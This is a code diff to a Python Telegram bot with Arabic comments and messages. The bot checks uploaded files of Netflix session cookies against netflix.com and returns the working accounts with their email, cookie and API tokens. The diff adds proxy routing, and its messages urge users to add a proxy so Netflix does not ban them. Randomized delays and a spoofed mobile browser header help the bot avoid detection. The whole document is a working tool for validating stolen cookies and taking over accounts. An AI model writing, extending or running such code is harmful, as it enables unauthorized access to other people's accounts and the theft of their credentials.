@@ -7,11 +7,14 @@ from telegram.constants import ParseMode
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 TOKEN = os.environ.get("BOT_TOKEN")
+PROXY = os.environ.get("PROXY", None)  # ← البروكسي اختياري
 
-# ========== دالة الفحص ==========
+# ========== دالة الفحص (باستخدام البروكسي إن وجد) ==========
 def check_cookie(cookie):
     try:
         sess = requests.Session()
+        proxies = {"http": PROXY, "https": PROXY} if PROXY else None
+
         headers = {
             "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -19,16 +22,17 @@ def check_cookie(cookie):
             "Cookie": cookie,
             "Referer": "https://www.netflix.com/",
         }
-        sess.get("https://www.netflix.com/", headers=headers, timeout=15, allow_redirects=True)
+        sess.get("https://www.netflix.com/", headers=headers, timeout=15, allow_redirects=True, proxies=proxies)
         time.sleep(random.uniform(1.0, 2.0))
-        sess.get("https://www.netflix.com/", headers=headers, timeout=15, allow_redirects=True)
+        sess.get("https://www.netflix.com/", headers=headers, timeout=15, allow_redirects=True, proxies=proxies)
         time.sleep(random.uniform(0.5, 1.5))
         r = sess.get(
             "https://www.netflix.com/YourAccount",
             headers=headers,
             timeout=20,
             allow_redirects=True,
-            max_redirects=5
+            max_redirects=5,
+            proxies=proxies
         )
         final_url = r.url.lower()
         result = {"status": "unknown", "cookie": cookie, "details": {}, "api_tokens": {}}
@@ -84,39 +88,31 @@ def extract_cookies_from_txt(file_bytes):
     content = file_bytes.decode("utf-8", errors="ignore")
     return [line.strip() for line in content.splitlines() if "=" in line.strip()]
 
-# ========== أوامر البوت ==========
+# ========== أوامر البوت (بدون تغيير) ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "👋 أهلاً بك في بوت فحص كوكيز Netflix\n\n"
         "📤 أرسل ملف .txt يحتوي على الكوكيز (كل كوكيز في سطر).\n"
-        "🔍 سيتم الفحص فوراً وإرسال الحسابات الصالحة فقط."
+        "🔍 سيتم الفحص فوراً وإرسال الحسابات الصالحة فقط.\n\n"
+        "⚠️ لتجنب الحظر، تأكد من إضافة بروكسي (اختياري)."
     )
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     doc = update.message.document
     if not doc:
         return
-
-    # التحقق من نوع الملف
     if not doc.file_name.endswith(".txt"):
         await update.message.reply_text("❌ الرجاء إرسال ملف .txt فقط")
         return
-
     await update.message.reply_text("⏳ جاري استخراج الكوكيز...")
-
-    # تحميل الملف
     file = await context.bot.get_file(doc.file_id)
     file_bytes = await file.download_as_bytearray()
     cookies = extract_cookies_from_txt(bytes(file_bytes))
-
     if not cookies:
         await update.message.reply_text("❌ لم يتم العثور على كوكيز صالحة في الملف")
         return
-
     unique_cookies = list(dict.fromkeys(cookies))
     await update.message.reply_text(f"🔍 جاري فحص {len(unique_cookies)} كوكيز...")
-
-    # الفحص
     valid_results = []
     start_time = time.time()
     with ThreadPoolExecutor(max_workers=4) as executor:
@@ -125,16 +121,13 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             res = future.result()
             if res.get("status") == "valid":
                 valid_results.append(res)
-
     elapsed = time.time() - start_time
     invalid = len(unique_cookies) - len(valid_results)
-
     await update.message.reply_text(
         f"✅ انتهى الفحص في {elapsed:.1f} ثانية.\n"
         f"📊 صالحة: {len(valid_results)}\n"
         f"❌ غير صالحة: {invalid}"
     )
-
     if valid_results:
         for i, acc in enumerate(valid_results, 1):
             details = acc.get("details", {})
@@ -142,7 +135,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             direct = tokens.get("direct_links", {})
             cookie = acc.get("cookie", "")
             api_token = tokens.get("api_token", "")
-
             msg = (
                 f"🎉 *حساب صالح #{i}*\n\n"
                 f"📧 *البريد:* `{details.get('email', 'غير معروف')}`\n"
@@ -162,7 +154,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]
             await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard), disable_web_page_preview=True)
     else:
-        await update.message.reply_text("😢 لا توجد حسابات صالحة. قد يكون عنوان IP محظوراً من Netflix.")
+        await update.message.reply_text("😢 لا توجد حسابات صالحة. قد يكون عنوان IP محظوراً من Netflix. جرب إضافة بروكسي.")
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.answer("استخدم الضغط المطول على النص لنسخه.")
